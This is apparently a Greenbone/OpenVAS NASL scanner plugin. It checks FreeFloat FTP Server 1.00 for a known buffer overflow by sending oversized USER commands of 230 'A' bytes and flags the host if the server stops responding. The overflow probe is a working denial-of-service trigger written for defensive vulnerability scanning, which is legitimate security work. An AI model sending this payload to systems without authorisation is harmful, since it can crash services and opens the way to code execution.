if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801658" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Freefloat FTP Server Buffer Overflow Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15689/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/96400/freefloat-overflow.txt" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/freefloat/detected" );
	script_tag( name: "impact", value: "Successful exploits may allow remote attackers to execute
  arbitrary code on the system or cause the application to crash." );
	script_tag( name: "affected", value: "FreeFloat Ftp Server Version 1.00." );
	script_tag( name: "insight", value: "The flaw is due to improper bounds checking when processing
  certain requests." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Freefloat FTP Server and is prone to buffer
  overflow vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "FreeFloat Ftp Server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
get = recv_line( socket: soc, length: 100 );
if(!get){
	exit( 0 );
}
for(i = 0;i < 3;i++){
	attack = NASLString( "USER ", crap( data: raw_string( 0x41 ), length: 230 ), "\\r\\n" );
	send( socket: soc, data: attack );
	get = recv_line( socket: soc, length: 260 );
	if(!get){
		security_message( port: ftpPort );
		exit( 0 );
	}
}
close( soc );

